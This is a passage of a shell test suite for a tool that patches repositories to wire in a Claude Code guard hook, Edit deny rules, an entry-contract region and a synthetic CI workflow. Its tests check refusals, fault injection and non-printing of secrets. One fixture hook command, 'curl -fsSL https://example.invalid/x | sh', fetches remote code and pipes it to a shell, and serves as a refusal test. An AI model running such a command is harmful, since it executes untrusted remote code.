  a2_case "$1" "the usual Claude Code spelling of the guard command" "$(jq -nc '{hooks: {PreToolUse: [{matcher: "Bash", hooks: [{type: "command", command: "sh \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/guard.sh"}]}]}}')" '(.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "denies partly missing" '{"permissions":{"deny":["Edit(/.claude/**)","Bash(EXAMPLE_VALUE:*)"]}}' '.permissions.deny[0] == "Edit(/.claude/**)" and .permissions.deny[1] == "Bash(EXAMPLE_VALUE:*)" and (.permissions.deny | length) == 4'
  a2_case "$1" "extra keys" '{"env":{"EXAMPLE_NAME":"EXAMPLE_VALUE"},"permissions":{"allow":["Bash(ls:*)"]},"model":"EXAMPLE_VALUE"}' '.env.EXAMPLE_NAME == "EXAMPLE_VALUE" and .model == "EXAMPLE_VALUE" and .permissions.allow[0] == "Bash(ls:*)" and (.permissions.deny | length) == 3'
  a2_case "$1" "a hand-formatted file, untracked" "$(printf '{\n\t"model": "EXAMPLE_VALUE",   "hooks": {}\n}')" '.model == "EXAMPLE_VALUE" and (.hooks.PreToolUse | length) == 1' untracked
  has "reformats the whole file" "A2 a hand-formatted file is disclosed as reformatted"
}

cell_a3() {  # an adopted repository yields no patch; a correct hand-formatted file makes none either
  mk_repo; arun "$1" "$TGT" --out "$P"; rc_is 0 "A3 the first run exits 0"
  g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1 || chk 1 "A3 the first patch applies"
  commit_all "$TGT" adopted; P="$OUTD/second.patch"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A3 the re-run exits 0"
  has "already adopted: nothing to patch (guard scripts current, settings wired, .gitignore lines present, entry contract current)" "A3 the re-run says nothing is left to patch"
  absent "$P" "A3 the re-run writes no file"
  absent "$P.pr.md" "A3 the re-run writes no PR body"
  mk_repo; mkdir -p "$TGT/.claude/hooks"; put_region "$1" "$TGT/CLAUDE.md"; put_region "$1" "$TGT/AGENTS.md"
  cp "$1/.claude/hooks/guard.sh" "$1/.claude/hooks/guard-core.sh" "$TGT/.claude/hooks/"
  jq -c . "$1/.claude/settings.json" > "$TGT/.claude/settings.json"
  printf '%s\n' ".claude/settings.local.json" ".kit-run/" > "$TGT/.gitignore"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A3 a correctly wired, hand-formatted file: the verb exits 0"
  has "entry contract current" "A3 a correctly wired, hand-formatted file with the current region in both files: nothing to patch"
  absent "$P" "A3 a correctly wired, hand-formatted file: no file"
  absent "$P.pr.md" "A3 a correctly wired, hand-formatted file: no PR body"
}

a4_cfg() {  # <kit> <label> <needle> <printf text for settings.json>
  mk_repo; mkdir -p "$TGT/.claude"; printf "$4" > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg
  arun "$1" "$TGT" --out "$P"; refused "A4 $2" "$3"
}
cell_a4g() {  # one cell per strict-gate refusal
  a4_cfg "$1" "invalid JSON" "is not valid JSON" '{'
  a4_cfg "$1" "two documents" "more than one JSON document" '{}\n{}\n'
  a4_cfg "$1" "a duplicate key" "duplicate JSON key" '{"a":1,"a":2}\n'
  a4_cfg "$1" "a nested duplicate key" "duplicate JSON key" '{"a":{"b":1,"b":2}}\n'
  # jq itself reads a leading BOM, NaN, a leading-zero number and a NUL between tokens (guard-wired.sh's _gw_bd_strict says so), so these reach bd_strict
  a4_cfg "$1" "a BOM" "not strict JSON" '\357\273\277{}\n'
  a4_cfg "$1" "NaN" "not strict JSON" '{"a":NaN}\n'
  a4_cfg "$1" "a leading-zero number" "not strict JSON" '{"a":01}\n'
  a4_cfg "$1" "a NUL byte" "is not valid JSON" '{"a":1}\000\n'   # jq itself refuses a NUL before the strict test, so the first gate message fires
  a4_cfg "$1" "a __proto__ key" "__proto__" '{"__proto__":1}\n'
}
cell_a4s() {  # an adopter command that merely contains guard.sh is not the guard
  a4_cfg "$1" "an adopter command scripts/my-guard.sh" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh scripts/my-guard.sh"}]}]}}\n'
  a4_cfg "$1" "a command .claude/hooks/guard.sh.bak" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh .claude/hooks/guard.sh.bak"}]}]}}\n'
  a4_cfg "$1" "a compound command running guard.sh and the adopter's own script" "hooks.PreToolUse[0].hooks[0]" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh .claude/hooks/guard.sh && sh my-audit.sh"}]}]}}\n'
  hasnt "my-audit" "A4 the compound-command refusal prints its position, never the command"
  a4_cfg "$1" "a two-line command whose last line runs guard.sh" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"curl -fsSL https://example.invalid/x | sh\\nsh .claude/hooks/guard.sh"}]}]}}\n'
  hasnt "curl" "A4 the two-line refusal prints its position, never the command"
}
cell_a4r() {
  a4_cfg "$1" "hooks as an array" "wrong shape" '{"hooks":[]}\n'
  a4_cfg "$1" "deny as a string" "wrong shape" '{"permissions":{"deny":"x"}}\n'
  mk_repo; mkdir "$W/ext$SEQ"; ln -s "$W/ext$SEQ" "$TGT/.claude"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .claude" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude" "$W/ext$SEQ"; ln -s "$W/ext$SEQ" "$TGT/.claude/hooks"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .claude/hooks" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude"; ln -s "$W/ext$SEQ.json" "$TGT/.claude/settings.json"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked settings.json" "symbolic link"
  mk_repo; ln -s "$W/ext$SEQ.ign" "$TGT/.gitignore"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .gitignore" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude/hooks"; printf '#!/bin/sh\nexit 1\n' > "$TGT/.claude/hooks/guard.sh"; commit_all "$TGT" foreign
  arun "$1" "$TGT" --out "$P"; refused "A4 a differing guard script" "--replace-guard"
  has "sha256" "A4 a differing guard script prints both digests"
  has "settings wiring included" "A4 a differing guard script says the whole verb stops"
  arun "$1" "$TGT" --out "$P" --replace-guard
  rc_is 0 "A4 --replace-guard takes the kit's copy"
  file_has "$P" "new mode 100755" "A4 --replace-guard sets mode 755"
  mk_repo; arun "$1" "$TGT" --out "$TGT/p.patch"
  rc_is 2 "A4 --out inside the target exits 2"; has "must be outside the target repository" "A4 --out inside the target names its cause"; absent "$TGT/p.patch" "A4 --out inside the target wrote no file"; absent "$TGT/p.patch.pr.md" "A4 --out inside the target wrote no PR body"
  mk_repo; : > "$P"; arun "$1" "$TGT" --out "$P"
  rc_is 2 "A4 an existing --out exits 2"; has "already exists" "A4 an existing --out names its cause"
  if [ ! -s "$P" ]; then chk 0 "A4 an existing --out is left as it was"; else chk 1 "A4 an existing --out is left as it was"; fi
  mk_repo; arun "$1" "$1" --out "$P"; refused "A4 the target being the kit itself" "the kit itself"
  mk_repo; mkdir -p "$TGT/.claude"; printf '{}\n' > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg; printf '{"model":"EXAMPLE_VALUE"}\n' > "$TGT/.claude/settings.json"
  arun "$1" "$TGT" --out "$P"; refused "A4 a dirty tracked settings.json" "uncommitted change"
  mk_repo; mkdir "$W/plain$SEQ"; arun "$1" "$W/plain$SEQ" --out "$P"; refused "A4 a directory that is not a repository" "not a git work tree"   # assumes the temp dir is outside any repository
  mk_repo; arun "$1" "$TGT" --out "$W/no-such-dir/p.patch"; rc_is 2 "A4 --out in a missing directory exits 2"
}
cell_a4() { cell_a4g "$1"; cell_a4s "$1"; cell_a4r "$1"; }

a5_fault() {  # <kit> <label> <sed script> <needle>: a verb with one fault injected must be refused by its own self-check, by the named refusal (exit 1, no file)
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "A5 fault $2" "$_fk" "$3" || return 0
  mk_repo; arun "$_fk" "$TGT" --out "$P"
  rc_is 1 "A5 $2: exits 1"
  absent "$P" "A5 $2: no file at --out"
  absent "$P.pr.md" "A5 $2: no PR body at --out"
  has "$4" "A5 $2: refused by the expected check"
}
cell_a5() {
  a5_fault "$1" "the matcher dropped" '/# FAULT-KIT$/s/matcher: \$m, //' "guard-wired.sh --rung1-only refused"
  a5_fault "$1" "a non-canonical command that only a WARN catches" '/# FAULT-KIT$/s|hooks: [[]{type: "command", command: \$c}[]]|hooks: [{type: "command", command: $c}, {type: "command", command: "sh guard.sh.bak"}]|' "guard-wired.sh warns"
  a5_fault "$1" "a deny dropped (rung 1 does not check them)" '/# FAULT-DENY$/s/\$d[[]]/$d[1:][]/' "lacks one of the three Edit denies"
}

a6_kit() {  # <label> <needle> <file in the kit> <sed|jq> <script>: a kit copy with one wiring source broken is refused
  SEQ=$((SEQ + 1)); _vk="$W/f$SEQ"; cp -Rp "$_k" "$_vk"
  if [ "$4" = sed ]; then sed "$5" "$_vk/$3" > "$_vk/tmp.out"; else jq "$5" "$_vk/$3" > "$_vk/tmp.out"; fi
  cat "$_vk/tmp.out" > "$_vk/$3"; rm -f "$_vk/tmp.out"
  mk_repo; arun "$_vk" "$TGT" --out "$P"; refused "A6 $1" "$2"
}
cell_a6() {
  _k=$1
  _n=$(fence_cmds "$_k/docs/adoption/brownfield.md" | jq -r '.command' | grep -cxF -- "$CANON" || true)
  if [ "$_n" = 2 ]; then chk 0 "A6 the extracted GW_CANON equals the command in both brownfield fences"; else chk 1 "A6 the extracted GW_CANON equals the command in both brownfield fences (saw $_n)"; fi
  mk_repo; arun "$_k" "$TGT" --out "$P"
  rc_is 0 "A6 the verb exits 0"
  g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1 || chk 1 "A6 the patch applies"
  if jq -e --arg c "$CANON" --arg m "$KMATCH" '.hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c and .permissions.deny == ["Edit(/.claude/**)", "Edit(/hooks/**)", "Edit(/.kit/**)"]' "$TGT/.claude/settings.json" >/dev/null 2>&1; then
    chk 0 "A6 the command, the matcher and exactly the three named denies come from the kit's files, and no other Edit entry"
  else chk 1 "A6 the command, the matcher and exactly the three named denies come from the kit's files, and no other Edit entry"; fi
  a6_kit "an emptied GW_CANON extraction" "GW_CANON" conformance/guard-wired.sh sed '/^GW_CANON=/d'
  a6_kit "a doubled GW_CANON extraction" "GW_CANON" conformance/guard-wired.sh sed '/^GW_CANON=/p'
  a6_kit "a kit settings file missing a named deny" "Edit denies" .claude/settings.json jq 'del(.permissions.deny[] | select(. == "Edit(/hooks/**)"))'
  a6_kit "a doubled canonical hook element" "PreToolUse" .claude/settings.json jq '.hooks.PreToolUse += .hooks.PreToolUse'
  a6_kit "an empty matcher" "matcher" .claude/settings.json jq '.hooks.PreToolUse[0].matcher = ""'
  a6_kit "a brownfield fence that differs from GW_CANON" "brownfield" docs/adoption/brownfield.md sed 's/the guard hook did not/the GUARD hook did not/'
}

put_region() {  # <kit> <file>: the kit's current region and closing heading, as a project's file would hold them
  { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; } > "$2"
}
a7_case() {  # <kit> <printf text for CLAUDE.md, or - for none>: a committed repository, then the verb
  mk_repo
  if [ "$2" != "-" ]; then printf "$2" > "$TGT/CLAUDE.md"; commit_all "$TGT" cfg; fi
  arun "$1" "$TGT" --out "$P"
}
a7_apply() {  # <label>: rc 0 and the patch applies to TGT
  rc_is 0 "A7 $1: the verb exits 0"
  [ "$RC" -eq 0 ] || return 1
  if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then return 0; fi
  chk 1 "A7 $1: git apply takes the patch"; return 1
}
a7_sec() {  # <label> <file>: the applied file's first "## " section is the kit's region ($W/a7.reg)
  region_of "$TGT/$2" > "$W/a7.sec"
  if cmp -s "$W/a7.sec" "$W/a7.reg"; then chk 0 "A7 $1: $2 opens with the kit's region"; else chk 1 "A7 $1: $2 opens with the kit's region"; fi
}
a7_line() {  # <label> <file> <line number> <text>
  if [ "$(sed -n "$3p" "$TGT/$2")" = "$4" ]; then chk 0 "A7 $1: line $3 of $2 is as designed"; else chk 1 "A7 $1: line $3 of $2 is as designed"; fi
}
a7_lock() {  # <kit> <label>: the kit's agents-brief.sh, run in the applied target with the adapter manifests, passes its entry-contract leg
  cp -Rp "$1/adapters" "$TGT/adapters"
  _ab=$(cd "$TGT" && sh "$1/conformance/agents-brief.sh" 2>&1) || true
  _ecl=$(ec_leg "$_ab") || _ecl=""
  if ec_graded "$_ecl"; then chk 0 "A7 $2: agents-brief.sh's entry-contract leg passes on the applied tree"; else chk 1 "A7 $2: agents-brief.sh's entry-contract leg passes on the applied tree"; fi
}
a7_tpl() {  # <kit> <label> <sed script> <needle>: a kit whose template yields an empty region or closing heading is refused (exit 2, a plain line)
  SEQ=$((SEQ + 1)); _tk="$W/f$SEQ"; cp -Rp "$1" "$_tk"
  sed "$3" "$_tk/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$_tk/tpl.out"; cat "$_tk/tpl.out" > "$_tk/templates/PROJECT-CLAUDE-TEMPLATE.md"; rm -f "$_tk/tpl.out"
  mk_repo; arun "$_tk" "$TGT" --out "$P"; refused "A7 $2" "$4"
  has "use a fresh kit export" "A7 $2 says what to do next"
}
a7_fault() {  # <kit>: both files given the same wrong region still pass the lock (it compares them with each other); the verb's own byte check must refuse
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "A7 fault the same wrong region in both files" "$_fk" '/# FAULT-REGION$/s,> "\$T/region",| tr e E > "$T/region",' || return 0
  mk_repo; arun "$_fk" "$TGT" --out "$P"
  rc_is 1 "A7 the same wrong region in both files: exits 1"
  absent "$P" "A7 the same wrong region in both files: no file at --out"
  absent "$P.pr.md" "A7 the same wrong region in both files: no PR body at --out"
  has "does not open with the kit's entry contract byte for byte" "A7 the same wrong region in both files: refused by the byte check"
}
a7_insert() {  # <kit>: a title and prose, no title, both files absent
  a7_case "$1" "# Example Title\n\nExample prose line.\n"
  if a7_apply "insert under a title"; then
    a7_sec "insert under a title" CLAUDE.md; a7_sec "insert under a title" AGENTS.md
    a7_line "insert under a title" CLAUDE.md 1 "# Example Title"
    a7_line "insert under a title" CLAUDE.md 3 "$(sed -n 1p "$W/a7.reg")"
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 insert under a title: the closing heading is in"
    if [ "$(tail -n 1 "$TGT/CLAUDE.md")" = "Example prose line." ]; then chk 0 "A7 insert under a title: the prose follows the closing heading"; else chk 1 "A7 insert under a title: the prose follows the closing heading"; fi
    has "  CLAUDE.md: the kit's entry contract goes in at the top" "A7 insert: a plain line for CLAUDE.md"
    has "  AGENTS.md: new file" "A7 insert: a plain line for AGENTS.md"
    has "**Intent owner:**" "A7 insert: the owed header fields are named"
    a7_lock "$1" "insert under a title"
  fi
  a7_case "$1" "Example prose only.\n"
  if a7_apply "insert with no title"; then
    a7_sec "insert with no title" CLAUDE.md
    a7_line "insert with no title" CLAUDE.md 1 "$(sed -n 1p "$W/a7.reg")"
    if [ "$(tail -n 1 "$TGT/CLAUDE.md")" = "Example prose only." ]; then chk 0 "A7 insert with no title: the prose follows the closing heading"; else chk 1 "A7 insert with no title: the prose follows the closing heading"; fi
  fi
  a7_case "$1" "# Example Title"
  if a7_apply "insert into a title-only file with no final newline"; then
    a7_line "a title-only file" CLAUDE.md 1 "# Example Title"
    a7_line "a title-only file" CLAUDE.md 2 ""
    a7_line "a title-only file" CLAUDE.md 3 "$(sed -n 1p "$W/a7.reg")"
  fi
  a7_case "$1" "-"
  if a7_apply "both files absent"; then
    a7_sec "both files absent" CLAUDE.md; a7_sec "both files absent" AGENTS.md
    a7_line "both files absent" AGENTS.md 1 "$(sed -n 1p "$W/a7.reg")"
    a7_lock "$1" "both files absent"
  fi
}
a7_replace() {  # <kit>: an old region is replaced and the heading after it stays
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\n## Example Next Heading\n\nExample project text.\n"
  if a7_apply "replace an old region"; then
    a7_sec "replace an old region" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "## Example Next Heading" "A7 replace: the heading after the old region stays"
    file_has "$TGT/CLAUDE.md" "Example project text." "A7 replace: the project's own text stays"
    file_has "$TGT/CLAUDE.md" "# Example Title" "A7 replace: the title stays"
    if grep -qF "Example old body line." "$TGT/CLAUDE.md"; then chk 1 "A7 replace: the old region is gone"; else chk 0 "A7 replace: the old region is gone"; fi
    has "  CLAUDE.md: everything from your old entry-contract heading up to the next '## ' heading is replaced" "A7 replace: a plain line for CLAUDE.md"
    a7_lock "$1" "replace an old region"
  fi
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\nExample note after.\n"
  if a7_apply "replace an only section"; then
    a7_sec "replace an only section" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 replace an only section: the kit's closing heading is added"
    a7_lock "$1" "replace an only section"
  fi
}
a7_wired() {  # <kit>: a committed repository with the guard wired and AGENTS.md holding the current region; the caller writes CLAUDE.md and commits
  mk_repo; mkdir -p "$TGT/.claude/hooks"; put_region "$1" "$TGT/AGENTS.md"
  cp "$1/.claude/hooks/guard.sh" "$1/.claude/hooks/guard-core.sh" "$TGT/.claude/hooks/"
  jq -c . "$1/.claude/settings.json" > "$TGT/.claude/settings.json"
  printf '%s\n' ".claude/settings.local.json" ".kit-run/" > "$TGT/.gitignore"
}
a7_adopted() {  # <kit>: an otherwise adopted repository, so the only thing left to judge is CLAUDE.md
  a7_wired "$1"; put_region "$1" "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A7 an adopted repository: the verb exits 0"
  has "entry contract current" "A7 an adopted repository: nothing to patch"
  # an identical region with prose above it must not read as current
  a7_wired "$1"; { printf 'Example prose above.\n\n'; region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"; refused "A7 an identical region with prose above it" "prose above its old entry contract"
  hasnt "entry contract current" "A7 an identical region with prose above it is not called current"
  # an identical region closed by a heading that renders empty: agents-brief.sh judges it, so it is refused, never called current
  for _eh in '## <br>' '## <!-- -->'; do
    a7_wired "$1"; { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; printf '%s\n\nExample text.\n' "$_eh"; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
    arun "$1" "$TGT" --out "$P"; refused "A7 an identical region closed by '$_eh'" "refuses your CLAUDE.md or AGENTS.md as they stand"
    has "fix what it names, then rerun" "A7 an identical region closed by '$_eh' says what to do next"
    hasnt "entry contract current" "A7 an identical region closed by '$_eh' is not called current"
  done
  # a closing heading in another script is visible text: current (the bytes are octal escapes for UTF-8, so the file holds no literal non-ASCII)
  a7_wired "$1"; { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; printf '## \316\244\316\255\316\273\316\277\317\202\n\nExample text.\n'; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A7 an identical region closed by a Greek heading: the verb exits 0"
  has "entry contract current" "A7 an identical region closed by a Greek heading is called current"
  # an identical region that is the only section: the closing heading is added
  a7_wired "$1"; region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  if a7_apply "an identical only section"; then
    a7_sec "an identical only section" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 an identical only section: the kit's closing heading is added"
    has "  CLAUDE.md: the kit's closing heading is added" "A7 an identical only section: a plain line for CLAUDE.md"
  fi
}
a7_tmpdir() {  # <kit>: a TMPDIR inside the target is refused before the work directory is created, on any mktemp (BSD ignores TMPDIR when no template is given)
  mk_repo; mkdir -p "$TGT/tmpd"; snap "$TGT" > "$W/snap.before"
  ARUN_TMP="$TGT/tmpd"; arun "$1" "$TGT" --out "$P"; ARUN_TMP=""
  refused "A7 a TMPDIR inside the target" "TMPDIR points inside the target repository"
  has "set TMPDIR outside it, then rerun" "A7 a TMPDIR inside the target says what to do next"
  snap "$TGT" > "$W/snap.after"
  if cmp -s "$W/snap.before" "$W/snap.after"; then chk 0 "A7 a TMPDIR inside the target leaves the target unchanged"; else chk 1 "A7 a TMPDIR inside the target leaves the target unchanged"; fi
}
a7_refusals() {  # <kit>
  a7_case "$1" "Example line\r\nsecond line\r\n"; refused "A7 a CR byte" "line endings"
  has "convert it to LF" "A7 a CR byte says what to do next"
  a7_case "$1" "# Example Title\n\n## Example Other\n\ntext\n\n## 1. Entry contract - EXAMPLE old\n\nbody\n"; refused "A7 a misplaced region" "not its first '## ' section"
  has "move it to the top, or delete it" "A7 a misplaced region says what to do next"
  a7_case "$1" "Example prose above.\n\n## 1. Entry contract - EXAMPLE old\n\nbody\n"; refused "A7 prose above an old region" "prose above its old entry contract"
  has "placement rule 1" "A7 prose above an old region names the rule"
  has "move the prose below the region, or delete the old region, then rerun" "A7 prose above an old region says what to do next"
  mk_repo; ln -s "$W/ext$SEQ.md" "$TGT/AGENTS.md"; arun "$1" "$TGT" --out "$P"; refused "A7 a symlinked AGENTS.md" "symbolic link"
  mk_repo; printf 'Example\n' > "$TGT/CLAUDE.md"; commit_all "$TGT" cfg; printf 'Example edited\n' > "$TGT/CLAUDE.md"
  arun "$1" "$TGT" --out "$P"; refused "A7 a dirty tracked CLAUDE.md" "uncommitted change"
  a7_tpl "$1" "a template with no region" 's/^## /### /' "no entry-contract section"
  a7_tpl "$1" "a template with no closing heading" '/^## 1\. Entry/!s/^## /### /' "no entry-contract section"
}
cell_a7() {  # the entry-contract region in CLAUDE.md and AGENTS.md (errata E1)
  region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$W/a7.reg"
  a7_insert "$1"
  a7_replace "$1"
  a7_refusals "$1"
  a7_adopted "$1"
  a7_tmpdir "$1"
  # an old region followed by a heading that renders empty passes the verb's own checks (it does not grade the terminator on a replace) and fails only the lock leg
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\n## <!-- -->\n\nExample text.\n"
  rc_is 1 "A7 an old region followed by an empty-rendering heading: exits 1"
  has "entry-contract check refused" "A7 an old region followed by an empty-rendering heading: refused by the lock leg"
  absent "$P" "A7 an old region followed by an empty-rendering heading: no file at --out"
  absent "$P.pr.md" "A7 an old region followed by an empty-rendering heading: no PR body at --out"
  a7_fault "$1"
}

cell_a8() {  # no forge, no credential, no network, no value printed
  mk_repo; mkdir -p "$TGT/.claude"; printf '%s\n' '{"env":{"EXAMPLE_NAME":"EXAMPLE_VALUE"}}' > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg
  : > "$W/stub.log"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A8 the verb exits 0"
  has "This patch contains your settings.json and its values, including its env values. Read it yourself; an agent should not read it." "A8 the settings-and-env warning is printed"
  hasnt "EXAMPLE_VALUE" "A8 no settings value reaches the terminal"
  hasnt "EXAMPLE_TOKEN_PLACEHOLDER" "A8 the placeholder token is never printed"
  if [ ! -s "$W/stub.log" ]; then chk 0 "A8 neither gh nor curl was called"; else chk 1 "A8 neither gh nor curl was called"; fi
}

# --- cells A9-A14, A16-A18 (SWAS-1009, design 9): the brownfield-stamp areas, the fitted ci.yml and --guard-only ---
mk_profile_ci() {  # <dest>: a synthetic profiles/typescript-node/ci.yml with the real file's step layout (design 9), in three parts; no quote characters, so each line is one single-quoted word
  : > "$1"; mk_profile_ci_head "$1"; mk_profile_ci_steps "$1"; mk_profile_ci_tail "$1"
}
mk_profile_ci_head() {  # <dest>: the header, the ci job's top, the checkout and the kit-owned changed-listing region
  printf '%s\n' \
    '# Synthetic reference CI for the fixture kit (EXAMPLE_VALUE): the real profile step layout.' \
    '# COPY & ADAPT: copy this file to your project .github/workflows/ci.yml.' \
    'name: CI' \
    'on:' \
    '  pull_request:' \
    '  push:' \
    '    branches: [main]' \
    'permissions:' \
    '  contents: read' \
    'jobs:' \
    '  ci:' \
    '    runs-on: ubuntu-24.04' \
    '    # >>> kit:db-backed (incept removes for non-DB archetypes)' \
    '    services:' \
    '      postgres:' \
    '        image: postgres:16' \
    '    env:' \
    '      DATABASE_URL: postgres://postgres:postgres@localhost:5432/app' \
    '    # <<< kit:db-backed' \
    '    steps:' \
    '      - uses: actions/checkout@0000000000000000000000000000000000000000  # v7.0.1' \
    '        with:' \
    '          fetch-depth: 0' \
    '' \
    '      # >>> kit:owned changed-listing' \
    '      - name: Clear the changed-path listing' \
    '        run: echo "KIT_CHANGED=" >> "$GITHUB_ENV"' \
    '      - name: Conformance aggregate (required)' \
    '        run: sh conformance/verify.sh --require --kit-selftests-on-change' \
    '      # <<< kit:owned changed-listing' >> "$1"
}
mk_profile_ci_steps() {  # <dest>: setup-node, install, the gate steps, the scan, the dependency scan and the SBOM
  printf '%s\n' \
    '' \
    '      - uses: actions/setup-node@0000000000000000000000000000000000000000  # v4' \
    '        with:' \
    '          node-version: 24' \
    '          cache: npm' \
    '' \
    '      - name: Install dependencies' \
    '        id: gate-install' \
    '        run: npm ci' \
    '' \
    '      - name: Lint' \
    '        id: gate-lint' \
    '        run: npm run lint' \
    '' \
    '      - name: Type-check' \
    '        id: gate-type-check' \
    '        run: npm run type-check' \
    '' \
    '      - name: Test + coverage' \
    '        id: gate-test' \
    '        run: npm run test:coverage' \
    '' \
    '      - name: Build' \
    '        id: gate-build' \
    '        run: npm run build' \
    '' \
    '      - name: Secret scan' \
    '        id: gate-secret-scan' \
    '        # Synthetic scan step: the fitter moves this block to just after the checkout.' \
    '        env:' \
    '          GL_EVENT: ${{ github.event_name }}' \
    '        run: echo EXAMPLE_VALUE secret scan' \
    '' \
    '      - name: Dependency vulnerability scan' \
    '        id: gate-dep-scan' \
    '        run: npm audit --omit=dev --audit-level=high' \
    '' \
    '      - name: Generate SBOM (CycloneDX)' \
    '        id: gate-sbom' \
    '        run: npx --yes @cyclonedx/cyclonedx-npm@6.0.0 --output-format JSON --output-file sbom.json' >> "$1"
}
mk_profile_ci_tail() {  # <dest>: the build artifact upload, its notice and the provenance job
  printf '%s\n' \
    '' \
    '      - name: Upload build artifact (for provenance)' \
    '        if: github.event_name == "push" && github.ref == "refs/heads/main"' \
    '        uses: actions/upload-artifact@0000000000000000000000000000000000000000  # v4' \
    '        with:' \
    '          name: build-artifact' \
    '          path: dist/**' \
    '          if-no-files-found: error' \
    '' \
    '      # Attestation needs a public repository or GitHub Enterprise Cloud: say so when the provenance job below skips.' \
    '      - name: Build provenance skipped (notice)' \
    '        if: github.event_name == "push" && github.ref == "refs/heads/main" && vars.KIT_ATTEST_PRIVATE != "true"' \
    '        run: |' \
    '          echo "::notice::Build provenance skipped: set KIT_ATTEST_PRIVATE once you have Enterprise Cloud"' \
    '' \
    '  # NOTE (provenance precondition): the attest step runs only where it can pass.' \
    '  provenance:' \
    '    needs: ci' \
    '    if: github.event_name == "push" && github.ref == "refs/heads/main"' \
    '    runs-on: ubuntu-24.04' \
    '    permissions:' \
    '      contents: read' \
    '      id-token: write' \
    '      attestations: write' \
    '    steps:' \
    '      - uses: actions/download-artifact@0000000000000000000000000000000000000000  # v4' \
    '        with:' \
    '          name: build-artifact' \
    '          path: build-artifact' \
    '      - name: Attest build provenance' \
    '        id: gate-provenance' \
    '        uses: actions/attest-build-provenance@0000000000000000000000000000000000000000  # v1' \
    '        with:' \
    '          subject-path: build-artifact/**' >> "$1"
}
mk_stamp_fixture() {  # the fixture kit's stamping inputs (design 9): stand-in workflows, a synthetic profile, the templates, the library and the kit's own judges, copied as guard-wired.sh is
  mkdir -p "$KIT0/profiles/typescript-node" "$KIT0/skills"   # skills: an empty kit folder, so the lint folder line (A19, A23) can name it
  for _sw in ratification adopter-gates adopter-tracker-gates adopter-trunk-trace solo-go; do
    printf '%s\n' "# COPY & ADAPT: synthetic EXAMPLE_VALUE stand-in for profiles/$_sw.yml" "name: $_sw" > "$KIT0/profiles/$_sw.yml"
  done
  mk_profile_ci "$KIT0/profiles/typescript-node/ci.yml"
  cp "$ROOT/profiles/typescript-node/CODEOWNERS" "$KIT0/profiles/typescript-node/CODEOWNERS"
  for _st in REQUIRED-CHECKS-TEMPLATE.md WAIVER-REGISTER.md JIRA-SETUP-TEMPLATE.md; do cp "$ROOT/templates/$_st" "$KIT0/templates/$_st"; done
  cp "$ROOT/scripts/stamp-lib.sh" "$KIT0/scripts/stamp-lib.sh"
  cp "$ROOT/scripts/tracker-conf.sh" "$KIT0/scripts/tracker-conf.sh"
  cp "$ROOT/conformance/ci-gates.sh" "$KIT0/conformance/ci-gates.sh"
  cp "$ROOT/conformance/branch-protection.sh" "$KIT0/conformance/branch-protection.sh"
  cp "$ROOT/conformance/backlog-lib.sh" "$KIT0/conformance/backlog-lib.sh"   # branch-protection.sh sources it from its own kit root, to resolve the declared backlog backend
}
